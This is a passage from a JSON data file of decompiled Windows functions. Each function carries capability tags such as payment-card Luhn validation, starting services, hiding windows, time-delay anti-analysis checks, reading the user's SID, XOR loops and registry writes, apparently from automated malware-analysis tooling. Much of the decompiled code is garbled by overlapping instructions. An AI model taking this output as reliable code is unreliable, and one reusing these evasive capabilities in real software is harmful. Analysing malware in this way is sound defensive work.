        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004044f9) overlaps instruction at (ram,0x004044f8)\n// \n\nint32_t __cdecl fcn.004044b0(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint in_ECX;\n    uint8_t *in_EDX;\n    uchar *unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    \n    uVar3 = in_ECX >> 8;\n    bVar4 = CARRY1(*in_EDX, uVar3);\n    bVar6 = SCARRY1(*in_EDX, uVar3);\n    *in_EDX = *in_EDX + uVar3;\n    bVar5 = *in_EDX == 0;\n    Var7 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    iVar2 = Var7;\n    if ((!bVar6) && (bVar6)) {\n        uVar1 = in(Var7 >> 0x20);\n        *unaff_EDI = uVar1;\n        if (!bVar4 && !bVar5) {\n            return -iVar2;\n        }\n    }\n    fcn.00403030(iVar2, 0x56);\n    iVar2 = fcn.004026e0(iVar2, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(Var7);\n    return iVar2;\n}\n",
        "token_count": 350
    },
    "00404540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404540(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004045e0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004047a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404806) overlaps instruction at (ram,0x00404805)\n// \n\nuint __cdecl fcn.004047a0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint8_t extraout_DL;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_10h;\n    uint *arg_14h;\n    \n    iVar3 = arg_ch;\n    puVar2 = arg_8h;\n    iVar5 = fcn.00403430(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar5 != 0) {\n        *(iVar5 + 0x58) = arg_ch;\n        arg_14h = &arg_8h;\n        uVar4 = &arg_ch;\n        cVar1 = uVar4 - *puVar2;\n        arg_10h = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar2) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                  (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                  ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar4 < *puVar2 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n                  | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        iVar5 = func_0x1018a778(arg_10h, arg_14h, &arg_ch);\n        *(iVar5 + 0x51) = *(iVar5 + 0x51) | extraout_DL;\n        fcn.00403430(puVar2 + 1, iVar3 + -1, arg_10h, arg_14h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 575
    },
    "004050b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004050b0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x42360c == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x42360c = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00405120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405120(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00404240": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404240(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &var_218h, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 281
    },
    "00404570": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404570(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 96
    },
    "00402a80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ad6) overlaps instruction at (ram,0x00402ad1)\n// \n\nvoid __cdecl fcn.00402a80(int32_t arg_8h, uint32_t arg_ch, uchar *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    uint8_t uVar4;\n    uchar *puVar5;\n    bool bVar6;\n    \n    uVar3 = 0;\n    bVar6 = arg_14h == 0;\n    uVar2 = arg_14h;\n    if (!bVar6) {\n        do {\n            puVar5 = arg_10h;\n            if ((!bVar6) && (bVar6)) {\n                puVar5 = arg_10h + 1;\n                out(*arg_10h, in_EDX);\n            }\n            puVar1 = puVar5 + uVar3;\n            if ((POPCOUNT(uVar2 & 0xff) & 1U) != 0) {\n                uVar3 = (uVar3 >> 8 & 0xffff00) << 8 | uVar3 & 0xffff;\n            }\n            in_EDX = uVar3 % arg_ch;\n            uVar4 = *puVar1 ^ *(in_EDX + arg_8h);\n            if ((uVar4 < '\\x01') || ('\\0' < uVar4)) {\n                puVar5[uVar3] = uVar4;\n            }\n            else {\n                *(arg_8h + -0x77c625aa) = *(arg_8h + -0x77c625aa) ^ uVar3;\n            }\n            uVar3 = uVar3 + 1;\n            bVar6 = uVar3 - arg_14h == 0;\n            arg_10h = puVar5;\n            uVar2 = uVar3 - arg_14h;\n        } while (uVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "004051d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00405205) overlaps instruction at (ram,0x00405204)\n// \n// WARNING: Removing unreachable block (ram,0x00405205)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __fastcall\nfcn.004051d0(uint32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4, uint32_t param_5, char *param_6)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t unaff_EBX;\n    char *pcVar7;\n    char **unaff_EDI;\n    char **ppcVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    bool bVar10;\n    bool bVar11;\n    \n    pcVar7 = NULL;\n    bVar11 = false;\n    bVar9 = param_6 == NULL;\n    pcVar3 = param_6;\n    if (0 < param_6) {\n        do {\n            uVar5 = param_2 >> 8;\n            bVar10 = pcVar3 < 0;\n            ppcVar8 = unaff_EDI;\n            if (bVar11 == bVar10) {\n                if (bVar11 != bVar10) {\n                    out(0xc4, param_6);\n                    ppcVar8 = unaff_EDI + 1;\n                    *unaff_EDI = param_6;\n                    cVar6 = unaff_EBX >> 8;\n                    bVar11 = SBORROW1(cVar6, *param_6);\n                    bVar10 = cVar6 - *param_6 < '\\0';\n                    bVar9 = cVar6 == *param_6;\n                }\n            }\n            unaff_EBX = unaff_EBX & 0xffffff00;\n            if ((!bVar9 && bVar11 == bVar10) && (bVar9 || bVar11 != bVar10)) {\n                uVar2 = 9 < (param_5 & 0xf) | in_AF;\n                uVar4 = CONCAT11((param_5 >> 8) + uVar2, param_5 + uVar2 * '\\x06') & 0xff0f;\n                if (param_1 != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                puVar1 = ((param_5 & 0xffff0000 | uVar4) - 1) + (unaff_EBX | pcVar7[param_5]);\n                uVar2 = *puVar1;\n                *puVar1 = *puVar1 + uVar5;\n                if ((param_5 & 0xffff0000 | uVar4 & 0xffffff00 | -CARRY1(uVar2, uVar5)) == 0x422) {\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(ppcVar8);\n                    return 0x1;\n                }\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(ppcVar8);\n                return NULL;\n            }\n            param_2 = pcVar7 % param_4 & 0xffffff00;\n            pcVar7[param_5] = param_6 ^ pcVar7[param_5] ^ *(pcVar7 % param_4 + param_3);\n            pcVar7 = pcVar7 + 1;\n            bVar11 = SBORROW4(pcVar7, param_6);\n            pcVar3 = pcVar7 + -param_6;\n            bVar9 = pcVar7 == param_6;\n            param_1 = param_5;\n            unaff_EDI = ppcVar8;\n        } while (pcVar7 < param_6);\n    }\n    return param_6;\n}\n",
        "token_count": 869
    },
    "004031f0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004031f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4232fc, 0x423340, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}